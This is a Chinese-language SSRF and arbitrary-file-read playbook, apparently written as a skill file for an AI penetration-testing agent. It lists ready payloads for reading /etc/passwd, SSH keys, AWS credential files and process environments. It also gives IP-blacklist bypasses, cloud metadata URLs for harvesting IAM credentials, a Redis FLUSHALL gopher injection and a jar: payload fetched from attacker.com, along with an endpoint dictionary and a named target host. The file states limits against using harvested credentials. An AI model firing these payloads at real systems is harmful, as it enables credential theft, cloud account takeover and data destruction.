---
name: ssrf-arbitrary-file
domain: ssrf|file-read
modes: [src, redteam, pentest]
exit_artifacts: [reproduction, impact]
---

# SSRF / 任意文件读取(高 ROI 主奖品)

## Domain

- 参数名:`url=` `path=` `file=` `target=` `redirect=` `callback=` `image=` `proxy=` `dest=` `next=` `r=` `u=` `link=`
- 响应暗示缺参:`Required parameter 'url'` / 接口名含 parse/fetch/preview/thumb/pdf/export
- 业务:截图/转发/PDF/RSS/Webhook/addon 类功能
- modes: src / redteam / pentest 均适用;高 ROI 主奖品

## Boundaries

- file:/// 读配置 = GET 类,不写不删
- 读到他人会话 cookie → 取证后停,不批量读
- 拿到 DB/云 IAM 凭据 → **不连 DB、不调云 API**,只截图证明
- 禁止用 gopher 打生产写库/删数据
- 无业务影响的纯 DNS 外带(无法证明读到数据)→ SRC 不报 verified

## Pivot Hints

- 黑名单只拦 127.0.0.1 → 试 0 / 0.0.0.0 / [::1] / 整数 IP / 十进制
- http 被拦 → file:// / dict:// / gopher:// / 混合编码
- 外带无回显 → 云 metadata / 内网 actuator / 时间差
- 参数不在 query → Body JSON / header / 二次 URL
- 卡死 >10 包无信号 → 换接口,标 Dead End

## Exit Evidence

### src
- E2: 可重放 curl(file:// 或 SSRF 链) + 响应含敏感片段
- E3: /etc/passwd 全文 / environ 含凭据 / 配置含密钥 / 云 IAM 可用证明(截图不调用)
- missing_artifacts 典型: [reproduction] 或 [impact]

### redteam
- E2: 能 SSRF 打到内网下一跳或读到凭据线索即可推进 hop
- 写 verified 仍须可重放请求
- 不要求商业三句;Kill Chain 写入口价值

## Tactics

> 原 Triggers / Coverage / Common misses / Verification 压缩如下;深度细节见文末 Reference(若有)。

## Triggers (何时用)

- 接口参数名:`url=` `path=` `file=` `target=` `redirect=` `callback=` `image=` `proxy=` `dest=` `next=` `r=` `u=` `link=`
- 接口响应:`{"message":"Required parameter 'url' is not present"}` / `{"code":...,"msg":"参数错误"}` 但**接口名字暗示 URL/文件处理**(`/parse /fetch /preview /thumb /pdf /export /import /addon`)
- 业务功能名:`/addon/* /service/* /tool/* /file/* /upload/* /download/* /preview/*`
- 任何**截图/转发/PDF生成/RSS抓取/Webhook回调**类功能

## Coverage points (查什么)

- **反射准则**:看到 `Required parameter 'X'` 错误 → X 决定打法(url→SSRF,path→任意文件读,id→IDOR,query→SQLi,xml→XXE)。详见 Reference。
- **5 个一发即中 payload**:file:// 读本地文件 / 路径穿越绕 URL 校验 / 内网 SSRF(IP 变体)/ 云元数据 / gopher·dict 协议。详见 Reference。
- **业务路径枚举**:`/addon/parse /service/url /tool/redirect /file/preview /proxy/forward` 等(详见 Reference 字典)
- 先看目标 host 在哪个云 + 哪个区(响应 header / IP 段),再选云元数据 payload

## Common misses (AI 常忘)

- **看到 `Required parameter 'url'` 就跑去做别的** —— 别人 2 包喂 `http://a/../../../../proc/self/environ` 拿到 root 环境变量 + DB 凭据,你 85 包出垃圾洞(示例甲方 uos 真实教训)。**这条 skill 就是为防 LLM 重复这个错而存在的**
- **不测云元数据** —— 目标在云上必怼,AWS/阿里/腾讯/GCP 各有不同元数据 IP
- **IP 黑名单绕过只试 127.0.0.1** —— `0` / `0.0.0.0` / `[::1]` / `2130706433`(整数)常漏
- **AWS IMDSv2 要 PUT token** —— 但 IMDSv1 对老配置一打一个准
- **`../` 数量不够** —— 至少 4 层,多打无害

## Verification (verified 标准)

凡是能拿到下面任一,就是高奖品:

- `/etc/passwd` 全文 → **任意文件读取**(SRC 通常评中-高)
- `/proc/self/environ` 含 `USER=root` `HOME=/root` → **以 root 跑的任意文件读**(高)
- 应用配置文件(`application.properties` `database.yml` `.env`)含 DB 密码 / API key → **凭据泄露 + 任意文件读双计**(严重)
- 云元数据 IAM credentials → **云租户接管**(严重,本来就上 CNVD 公告)
- `/proc/<pid>/cmdline` 含命令行密码 → **凭据泄露**

## ⚠️ 红线

- `file:///` 读应用配置文件 = **GET 类操作,不写不删**,合规
- 读 `/proc/self/environ` 含他人会话 cookie → **取证后立即停**,**不批量读**(否则可能触个保法)
- 拿到 DB 凭据后,**绝不连 DB 验证**(直接连 = 触法律红线第 1 条),报告里写"凭据已暴露,未实际连接验证"即可
- 拿到云 IAM credentials 后,**绝不调 AWS API**,只截图证明 + 写入报告

## Related playbooks

- `[[acme-uos-missed-ssrf-arbitrary-file-read]]` — 本 skill 诞生的教训,2026-06-16 同目标别人 2 包出 DB,我 85 包出垃圾
- `auth-bypass.md` — 401/403 时 path 维度的姿势,这边是参数维度
- `api-guessing.md` — 业务路径枚举(配合本 skill 用)

## Reference (深度参考 — AI 可能不会的细节)

### 反射准则 — `Required parameter 'X'` 决定打法

| X 是什么 | 立刻打 |
|---|---|
| `url / link / target / dest / next` | SSRF + 任意 URL 读 |
| `path / file / dir / src / image` | 任意文件读取 |
| `id / uid / orderId / userId` | IDOR |
| `query / keyword / sort / orderBy` | SQLi / NoSQLi |
| `xml / data` | XXE / XML 反序列化 |

### 5 个一发即中 payload(URL/path 参数怼这五个)

#### 1. file:// 协议读本地文件(最直接)

```
url=file:///etc/passwd
url=file:///etc/hosts
url=file:///proc/self/environ          ← root 环境变量,常含 DB host
url=file:///proc/self/cmdline          ← 启动命令行,可能含密钥参数
url=file:///proc/self/cwd/application.properties   ← Spring Boot 配置
url=file:///root/.aws/credentials      ← AWS 凭据
url=file:///root/.ssh/id_rsa
```

#### 2. 路径穿越(URL 校验绕过)

服务端如果限制必须 `http://`,加个虚假 host 前缀骗过校验:

```
url=http://a/../../../../etc/passwd
url=http://attacker.com/../../../etc/passwd
url=http://127.0.0.1/../../../etc/passwd
url=http://uos.smartedu.acme.com/../../../etc/passwd     ← 用目标自己 host 骗
```

注意 `../` 数量要够多(至少 4 层),反正多打无害。

#### 3. 内网/本机 SSRF(打内部接口)

```
url=http://127.0.0.1/                      ← 本机其他服务
url=http://127.0.0.1:8080/actuator/env     ← Spring Boot actuator 内网未授权
url=http://localhost:8500/v1/kv/?recurse   ← Consul KV
url=http://172.31.0.1/                     ← 内网网关
url=http://[::1]/                          ← IPv6 localhost,IP 黑名单常漏
url=http://0.0.0.0/                        ← 等价 127.0.0.1,黑名单常漏
url=http://0/                              ← 0 等价 0.0.0.0,极简短
url=http://2130706433/                     ← 127.0.0.1 的整数表示,绕字符黑名单
```

#### 4. 云元数据(目标在云上必怼)

**先看目标 host 在哪个云 + 哪个区**:
- 响应 header `X-Amz-Cf-Pop` / IP 段 52.83.* / `cn-north-1` → AWS 中国宁夏
- IP 段 47.* / 阿里云 / 116.62.* → 阿里云
- IP 段 119.29.* / 49.232.* → 腾讯云

```
# AWS(包括 cn-north-1 / cn-northwest-1)
url=http://169.254.169.254/latest/meta-data/
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
url=http://169.254.169.254/latest/user-data
url=http://169.254.169.254/latest/dynamic/instance-identity/document

# 阿里云
url=http://100.100.100.200/latest/meta-data/
url=http://100.100.100.200/latest/meta-data/ram/security-credentials/

# 腾讯云
url=http://metadata.tencentyun.com/latest/meta-data/

# Google Cloud
url=http://metadata.google.internal/computeMetadata/v1/
```

注意 AWS IMDSv2 需要 PUT token,但 IMDSv1 这一招对老配置一打一个准。

#### 5. gopher/dict/其他协议(redis/memcached SSRF→RCE)

```
url=gopher://127.0.0.1:6379/_FLUSHALL%0d%0a   ← Redis 命令注入
url=dict://127.0.0.1:11211/stats              ← memcached 探活
url=ldap://127.0.0.1:389/                     ← LDAP
url=ftp://127.0.0.1/
url=jar:http://attacker.com/x.jar!/META-INF/MANIFEST.MF  ← Java SSRF jar 协议
```

### 业务路径字典(必扫)

通用字典(`/api /admin /login`)挖不到的业务路径,**这些是 SRC 高奖洞的家**:

```
/addon/parse     /addon/fetch        /addon/proxy        /addon/preview
/service/url     /service/parse      /service/render
/tool/url        /tool/redirect      /tool/preview
/file/upload     /file/download      /file/preview       /file/export
/proxy/forward   /proxy/get          /proxy/url
/url/redirect    /url/parse          /url/preview
/share/preview   /share/url          /share/proxy
/render/url      /render/preview
/pdf/export      /pdf/render         /pdf/url
/thumb/url       /image/proxy        /image/url
/oauth/callback  /oauth/redirect
/webhook         /callback
```

发现 200 / 405 / `Required parameter` 错误 → 立刻试 5 payload。

